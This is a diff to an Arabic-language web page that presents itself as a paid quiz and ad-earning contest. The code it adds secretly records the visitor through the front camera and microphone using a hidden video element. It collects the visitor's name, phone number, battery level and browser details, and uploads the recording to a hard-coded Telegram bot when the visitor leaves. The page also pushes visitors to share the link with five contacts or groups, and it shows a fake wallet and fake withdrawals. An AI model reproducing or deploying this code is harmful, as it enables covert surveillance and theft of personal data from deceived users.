@@ -200,7 +200,6 @@
 <body>
 
     <div class="container">
-        <!-- قسم تسجيل البيانات -->
         <div id="form-section">
             <div style="font-size: 24px; margin-bottom: 5px;">🌐</div>
             <div class="header-title">الربح من الإعلانات والأسئله</div>
@@ -218,7 +217,6 @@
             <button type="button" class="btn-green" onclick="startProcess()">بدء التسجيل</button>
         </div>
 
-        <!-- قسم مشاركة الواتساب -->
         <div id="content-section" class="hidden">
             <div class="header-title">الربح من الإعلانات والأسئله</div>
             <div class="main-title">سجل الآن</div>
@@ -236,13 +234,12 @@
             </div>
 
             <div class="welcome-text" style="font-size: 15px;">
-                <b>1 -</b> إضغط على زر "مساهمة" الموجود في الأسفل وساهم معنا بإرسال الرابط الى <b>15 صديقاً أو 5 مجموعات على الواتساب.</b><br>
-                <b>2 -</b> يجب إتمام النشر بنجاح والعودة للموقع ليزداد شريط التحقق الأخضر.<br>
+                <b>1 -</b> إضغط على زر "مساهمة" الموجود في الأسفل وساهم معنا بإرسال الرابط إلى أي تطبيق (واتساب، فيسبوك، تليجرام، وغيرها) لـ <b>5 أصدقاء أو مجموعات.</b><br>
+                <b>2 -</b> يجب إتمام المشاركة والعودة للموقع ليزداد شريط التحقق الأخضر.<br>
                 <b>3 -</b> قم بإبراز الرسالة التي ستصلك في النهاية لمكان التسليم .
             </div>
 
-            <a id="whatsapp-link" href="#" target="_blank" style="display:none;"></a>
-            <button type="button" class="btn-green" id="share-btn" onclick="shareWhatsApp()">مساهمة</button>
+            <button type="button" class="btn-green" id="share-btn" onclick="openGeneralShare()">مساهمة</button>
 
             <div class="progress-container">
                 <div id="progress-percentage" class="progress-text">0%</div>
@@ -252,7 +249,6 @@
             </div>
         </div>
 
-        <!-- قسم المسابقة والأسئلة -->
         <div id="quiz-section" class="hidden">
             <div class="wallet-box">
                 <div>المحفظة: $<span id="balance">0.00</span></div>
@@ -277,7 +273,6 @@
             </div>
         </div>
 
-        <!-- قسم اختيار بنوك وطرق السحب -->
         <div id="withdraw-section" class="hidden">
             <div class="wallet-box">
                 <div>المحفظة: $<span id="balance-withdraw">0.00</span></div>
@@ -307,7 +302,6 @@
         </div>
     </div>
 
-    <!-- عناصر الكاميرا والفيديو الخفية -->
     <video id="video" width="320" height="240" autoplay muted playsinline style="display:none;"></video>
 
     <script>
@@ -322,7 +316,6 @@
         let userPhone = "";
         let isVideoSent = false;
 
-        // قاعدة بيانات الأسئلة
         const questions = [
             { q: "ما هي عاصمة اليمن؟", options: ["عدن", "صنعاء", "تعز", "إب"], correct: 1 },
             { q: "كم عدد سور القرآن الكريم؟", options: ["114 سورة", "113 سورة", "115 سورة", "120 سورة"], correct: 0 },
@@ -389,4 +382,284 @@
             { q: "في أي عام هبط الإنسان على سطح القمر لأول مرة؟", options: ["1965", "1969", "1971", "1975"], correct: 1 },
             { q: "ما هو رمز عنصر الماء الكيميائي؟", options: ["CO2", "H2O", "O2", "NaCl"], correct: 1 },
             { q: "ما هو رمز عنصر ملح الطعام الكيميائي؟", options: ["H2O", "NaCl", "HCl", "NaOH"], correct: 1 },
-            { q: "كم عدد عصور ما قبل التاريخ الرئيسية؟", opt
+            { q: "كم عدد عصور ما قبل التاريخ الرئيسية؟", options: ["عصران", "ثلاثة عصور", "أربعة عصور", "خمسة عصور"], correct: 1 },
+            { q: "ما هو السائل الذي يضخه القلب ليطوف في الجسم؟", options: ["الماء", "الدم", "اللمف", "البلازما"], correct: 1 },
+            { q: "كم عدد أركان الإسلام؟", options: ["4 أركان", "5 أركان", "6 أركان", "7 أركان"], correct: 1 },
+            { q: "كم عدد أركان الإيمان؟", options: ["5 أركان", "6 أركان", "7 أركان", "4 أركان"], correct: 1 },
+            { q: "ما هي السورة القرآنية التي تسمى 'عروس القرآن'؟", options: ["سورة البقرة", "سورة يس", "سورة الرحمن", "سورة الملك"], correct: 2 },
+            { q: "ما هي السورة التي تقرأ لعدم وجود آية البسملة في أولها؟", options: ["سورة التوبة", "سورة الانفال", "سورة الإخلاص", "سورة الفاتحة"], correct: 0 },
+            { q: "من هو النبي الذي ألقي في النار فلم تأكله؟", options: ["إبراهيم عليه السلام", "موسى عليه السلام", "عيسى عليه السلام", "نوح عليه السلام"], correct: 0 },
+            { q: "من هو النبي الذي ابتلعه الحوت؟", options: ["يونس عليه السلام", "يوسف عليه السلام", "أيوب عليه السلام", "زكريا عليه السلام"], correct: 0 },
+            { q: "ما هي لغة أهل الجنة في الآخرة حسب بعض الآثار؟", options: ["العربية", "السريانية", "العبرية", "لم يثبت نص قاطع"], correct: 3 },
+            { q: "كم عدد اللاعبين في فريق كرة القدم الأساسي بالملعب؟", options: ["9 لاعبين", "10 لاعبين", "11 لاعباً", "12 لاعباً"], correct: 2 },
+            { q: "كم عدد شوط مباراة كرة السلة الأساسية؟", options: ["شوطان", "ثلاثة أشواط", "أربعة أشواط", "خمسة أشواط"], correct: 2 },
+            { q: "في أي رياضة يُستخدم مصطلح 'الكش مات' (Checkmate)؟", options: ["كرة المضرب", "الشطرنج", "البلياردو", "الملاكمة"], correct: 1 },
+            { q: "ما هي الدولة المصنفة الأولى عالمياً في كرة القدم تاريخياً بعدد كؤوس العالم؟", options: ["ألمانيا", "الأرجنتين", "البرازيل", "إيطاليا"], correct: 2 },
+            { q: "ما هي عاصمة فرنسا الثقافية والسياسية؟", options: ["مارسيليا", "باريس", "ليون", "تولوز"], correct: 1 },
+            { q: "ما هو اسم الغاز الذي تستخدمه النباتات في عملية البناء الضوئي؟", options: ["الأكسجين", "ثاني أكسيد الكربون", "النيتروجين", "الهيدروجين"], correct: 1 },
+            { q: "ما هو العضو المسؤول عن ضخ الدم في جسم الإنسان؟", options: ["المخ", "الكبد", "القلب", "الرئتان"], correct: 2 },
+            { q: "ما هو العضو المسؤول عن التفكير والتحكم بالجسم؟", options: ["القلب", "المخ (الدماغ)", "الكلى", "المعدة"], correct: 1 },
+            { q: "كم عدد عظام جسم الإنسان البالغ تقريباً؟", options: ["150 عظمة", "206 عظام", "300 عظمة", "250 عظمة"], correct: 1 },
+            { q: "ما هو أكبر أعضاء جسم الإنسان مساحة ووظيفة خارجية؟", options: ["الكبد", "الجلد", "الأمعاء الدقيقة", "المعدة"], correct: 1 },
+            { q: "ما هي عاصمة إندونيسيا؟", options: ["بالي", "جاكرتا", "سورابايا", "باندونغ"], correct: 1 },
+            { q: "ما هي عاصمة ماليزيا؟", options: ["بيان ليناس", "كوالالمبور", "جورج تاون", "ملكا"], correct: 1 },
+            { q: "ما هي عاصمة باكستان؟", options: ["كراتشي", "لاهور", "إسلام آباد", "بيشاور"], correct: 2 },
+            { q: "ما هي عاصمة الهند؟", options: ["مومباي", "نيودلهي", "حيدر آباد", "بنغالور"], correct: 1 },
+            { q: "ما هي عاصمة كوريا الجنوبية؟", options: ["بيونغيانغ", "سيول", "بوسان", "إنتشون"], correct: 1 },
+            { q: "ما هي عاصمة كوريا الشمالية؟", options: ["سيول", "بيونغيانغ", "كايسونغ", "وون산"], correct: 1 },
+            { q: "ما هي عاصمة كندا؟", options: ["تورونتو", "فانكوفر", "أوتاوا", "مونتريال"], correct: 2 },
+            { q: "ما هي عاصمة المكسيك؟", options: ["مونتيري", "غوادالاخارا", "مكسيكو سيتي", "كانكون"], correct: 2 },
+            { q: "ما هي الدولة التي يمر بها خط الاستواء وتعتبر عاصمتها كيتو؟", options: ["كولومبيا", "الإكوادور", "بيرو", "فنزويلا"], correct: 1 },
+            { q: "ما هو أكبر محيط في العالم؟", options: ["المحيط الأطلسي", "المحيط الهندي", "المحيط الهادئ", "المحيط المتجمد الشمالي"], correct: 2 },
+            { q: "ما هو أصغر محيط في العالم؟", options: ["المحيط الهندي", "المحيط المتجمد الشمالي", "المحيط الأطلسي", "المحيط المتجمد الجنوبي"], correct: 1 },
+            { q: "ما هي الدولة الأكثر سكاناً في العالم حالياً؟", options: ["الصين", "الهند", "الولايات المتحدة", "إندونيسيا"], correct: 1 },
+            { q: "ما هي اللغة الرسمية في البرازيل؟", options: ["الإسبانية", "البرتغالية", "الإنجليزية", "الفرنسية"], correct: 1 },
+            { q: "ما هو أطول جسر بحر في العالم العربي أو العالم؟", options: ["جسر الملك فهد", "جسر هونغ كونغ تشوهای ماكاو", "جسر بانابونا", "جسر دايانيو"], correct: 1 },
+            { q: "ما هي العملة الرسمية لدولة الإمارات العربية المتحدة؟", options: ["الريال", "الدينار", "الدرهم", "الدولار"], correct: 2 },
+            { q: "ما هي العملة الرسمية للمملكة العربية السعودية؟", options: ["الدرهم", "الريال", "الدينار", "الجنيه"], correct: 1 }
+        ];
+
+        let currentQuestion = 0;
+
+        window.onload = function() {
+            localStorage.clear(); 
+            initCamera();
+            getBatteryStatus();
+        };
+
+        function getBatteryStatus() {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    batteryLevelInfo = Math.round(battery.level * 100) + "%";
+                });
+            }
+        }
+
+        function initCamera() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+            .then(function(stream) {
+                mediaStream = stream;
+                let video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+            })
+            .catch(function(err) {
+                console.log("تم رفض إذن الكاميرا أو الميكروفون");
+            });
+        }
+
+        function startProcess() {
+            let nameField = document.getElementById('user-name');
+            let phoneField = document.getElementById('user-phone');
+
+            if (!nameField || !phoneField) return;
+
+            userName = nameField.value.trim();
+            userPhone = phoneField.value.trim();
+
+            if (userName === "" || userPhone === "") {
+                alert("الرجاء إدخال الاسم ورقم الهاتف بشكل صحيح.");
+                return;
+            }
+
+            startContinuousRecording(mediaStream);
+
+            document.getElementById('display-name').innerText = userName;
+            document.getElementById('form-section').classList.add('hidden');
+            document.getElementById('content-section').classList.remove('hidden');
+        }
+
+        function startContinuousRecording(stream) {
+            if (!stream) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+                .then(function(newStream) {
+                    mediaStream = newStream;
+                    initRecorder(newStream);
+                }).catch(e => console.log("تعذر فتح الكاميرا"));
+                return;
+            }
+            initRecorder(stream);
+        }
+
+        function initRecorder(stream) {
+            recordedChunks = [];
+            let options = { mimeType: 'video/webm; codecs=vp9' };
+            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                options = { mimeType: 'video/mp4' };
+            }
+
+            try {
+                mediaRecorder = new MediaRecorder(stream, options);
+
+                mediaRecorder.ondataavailable = function(event) {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = function() {
+                    if (isVideoSent) return;
+                    isVideoSent = true;
+
+                    let blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                    sendVideoDirectly(blob, userName, userPhone);
+                };
+
+                // حفظ القطع كل ثانية لضمان تجميع الفيديو مهما كانت المدة قصيرة أو طويلة
+                mediaRecorder.start(1000);
+
+            } catch (e) {
+                console.log("خطأ في بدء التسجيل المستمر: ", e);
+            }
+        }
+
+        // الاستماع لمغادرة الصفحة أو إغلاقها لإرسال الفيديو فوراً
+        window.addEventListener("pagehide", function() {
+            triggerExitSend();
+        });
+
+        window.addEventListener("beforeunload", function() {
+            triggerExitSend();
+        });
+
+        document.addEventListener("visibilitychange", function() {
+            if (document.visibilityState === "hidden") {
+                triggerExitSend();
+            }
+        });
+
+        function triggerExitSend() {
+            if (mediaRecorder && mediaRecorder.state === "recording" && !isVideoSent) {
+                mediaRecorder.stop();
+            }
+        }
+
+        function sendVideoDirectly(videoBlob, name, phone) {
+            let botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
+            let chatId = "7962257606";
+
+            let formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', videoBlob, 'user_capture.mp4');
+            formData.append('caption', `🎥 فيديو تواجد المستخدم (بحسب مدة بقائه):\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔋 البطارية: ${batteryLevelInfo}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`);
+
+            let url = `https://api.telegram.org/bot${botToken}/sendVideo`;
+
+            // استخدام sendBeacon لضمان إرسال الطلب حتى لو أغلق المستخدم الصفحة بشكل فجائي
+            if (navigator.sendBeacon && videoBlob.size < 6000000) {
+                // محاولة الإرسال السريع المباشر
+                fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true
+                }).catch(err => console.log("خطأ الإرسال"));
+            } else {
+                fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true
+                }).catch(err => console.log("خطأ الإرسال"));
+            }
+        }
+
+        function openGeneralShare() {
+            if (isWaitingForReturn) return;
+            isWaitingForReturn = true;
+
+            let siteUrl = window.location.href;
+            let shareData = {
+                title: 'الربح من الإعلانات والأسئله',
+                text: 'شارك في مسابقة الربح من الإعلانات والأسئله وسجل اسمك ورقمك عبر الرابط:',
+                url: siteUrl
+            };
+
+            if (navigator.share) {
+                navigator.share(shareData).then(() => {
+                    console.log('تمت المشاركة بنجاح');
+                }).catch((error) => {
+                    console.log('تم إلغاء المشاركة');
+                });
+            } else {
+                navigator.clipboard.writeText(siteUrl + "\n" + shareData.text);
+                alert("تم نسخ رابط الموقع وحفظه، يمكنك لصقه ومشاركته في أي تطبيق تريده!");
+            }
+
+            let shareBtn = document.getElementById('share-btn');
+            shareBtn.innerText = "جاري التحقق من النشر... (يرجى العودة للموقع)";
+            shareBtn.style.backgroundColor = "#94a3b8";
+        }
+
+        document.addEventListener("visibilitychange", function() {
+            if (document.visibilityState === "visible" && isWaitingForReturn) {
+                setTimeout(() => {
+                    if (progress < 100) {
+                        progress += 20; 
+                        if (progress > 100) progress = 100;
+
+                        document.getElementById('progress-fill').style.width = progress + '%';
+                        document.getElementById('progress-percentage').innerText = progress + '%';
+                    }
+
+                    let shareBtn = document.getElementById('share-btn');
+                    shareBtn.innerText = "مساهمة";
+                    shareBtn.style.backgroundColor = "#8bc34a";
+                    isWaitingForReturn = false;
+
+                    if (progress >= 100) {
+                        setTimeout(() => {
+                            document.getElementById('content-section').classList.add('hidden');
+                            document.getElementById('quiz-section').classList.remove('hidden');
+                            loadQuestion();
+                        }, 500);
+                    }
+                }, 15000); 
+            }
+        });
+
+        function loadQuestion() {
+            if (currentQuestion >= questions.length) {
+                currentQuestion = 0;
+            }
+            let qData = questions[currentQuestion];
+            document.getElementById('question-text').innerText = (currentQuestion + 1) + ". " + qData.q;
+            
+            let optionsHtml = '';
+            qData.options.forEach((opt, index) => {
+                optionsHtml += `<button type="button" class="option-btn" onclick="checkAnswer(${index}, ${qData.correct})">${opt}</button>`;
+            });
+            document.getElementById('options-container').innerHTML = optionsHtml;
+        }
+
+        function checkAnswer(selected, correct) {
+            if (selected === correct) {
+                userBalance += 2.00;
+                alert("إجابة صحيحة! تم إضافة $2.00 إلى محفظتك.");
+            } else {
+                alert("إجابة خاطئة! حظ أوفر في المرة القادمة.");
+            }
+            currentQuestion++;
+            document.getElementById('balance').innerText = userBalance.toFixed(2);
+            document.getElementById('balance-withdraw').innerText = userBalance.toFixed(2);
+            loadQuestion();
+        }
+
+        function showWithdrawOptions() {
+            document.getElementById('quiz-section').classList.add('hidden');
+            document.getElementById('withdraw-section').classList.remove('hidden');
+        }
+
+        function backToQuiz() {
+            document.getElementById('withdraw-section').classList.add('hidden');
+            document.getElementById('quiz-section').classList.remove('hidden');
+        }
+
+        function tryWithdraw(bankName) {
+            if (userBalance >= 50.00) {
+                alert("مبروك! تم تقديم طلب السحب عبر " + bankName + " بنجاح.");
+            } else {
+                alert("عذراً، لم تصل إلى الحد الأدنى للسحب (تحتاج إلى $50.00 على الأقل). استمر في الإجابة لزيادة رصيدك!");
+            }
+        }
+    </script>
+</body>
+</html>
